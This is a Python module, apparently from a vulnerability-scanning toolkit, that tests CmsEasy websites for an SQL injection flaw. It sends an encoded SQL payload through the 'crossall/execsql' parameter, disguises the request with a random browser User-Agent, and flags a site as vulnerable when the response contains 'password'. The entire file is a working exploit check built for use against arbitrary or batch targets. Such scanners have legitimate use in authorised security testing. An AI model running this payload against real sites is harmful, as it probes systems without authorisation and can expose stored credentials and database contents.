import requests
import urllib3
from urllib import parse
from time import time
import random
from pub.com.outprint import OutPrintInfo,OutPrintInfoSuc
from pub.com.reqset import ReqSet
from pub.com.output import OutPutFile
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)


class CmsEasySqlScan:
	def get_ua(self):
		first_num = random.randint(55, 62)
		third_num = random.randint(0, 3200)
		fourth_num = random.randint(0, 140)
		os_type = [
			'(Windows NT 6.1; WOW64)', '(Windows NT 10.0; WOW64)',
			'(Macintosh; Intel Mac OS X 10_12_6)'
		]
		chrome_version = 'Chrome/{}.0.{}.{}'.format(first_num, third_num, fourth_num)

		ua = ' '.join(['Mozilla/5.0', random.choice(os_type), 'AppleWebKit/537.36',
					   '(KHTML, like Gecko)', chrome_version, 'Safari/537.36']
					  )
		return ua

	def check_url(self,url):
		url=parse.urlparse(url)
		url='{}://{}'.format(url[0],url[1])
		url=url + "/?case=crossall&act=execsql&sql=Ud-ZGLMFKBOhqavNJNK5WRCu9igJtYN1rVCO8hMFRM8NIKe6qmhRfWexXUiOqRN4aCe9aUie4Rtw5"
		headers = {
			'User-Agent': self.get_ua(),
		}
		try:
			res = requests.get(url, verify=self.ssl, allow_redirects=False, headers=headers, timeout=self.timeout,proxies=self.proxy)
			if res.status_code == 200 and 'password' in res.text:
				OutPrintInfoSuc("CmsEasy",f"目标存在漏洞 {url}")
				OutPutFile("cmseasy_sql.txt",f"目标存在漏洞 {url}")
			else:
				if not self.batch:
					OutPrintInfo("CmsEasy","目标不存在漏洞")
		except Exception as e:
			if not self.batch:
				OutPrintInfo("CmsEasy","目标请求出错")


	def main(self,target):
		self.batch = target["batch_work"]
		url=target["url"].strip("/ ")
		self.ssl = target["ssl"]
		self.timeout = int(target["timeout"])
		proxy = target["proxy"]
		_, self.proxy = ReqSet(proxy=proxy, bwork=self.batch)

		if not self.batch:
			OutPrintInfo("CmsEasy","任务开始.....")
		start=time()
		self.check_url(url)
		end=time()
		if not self.batch:
			OutPrintInfo("CmsEasy",f'任务完成,用时{str(end-start)}s' )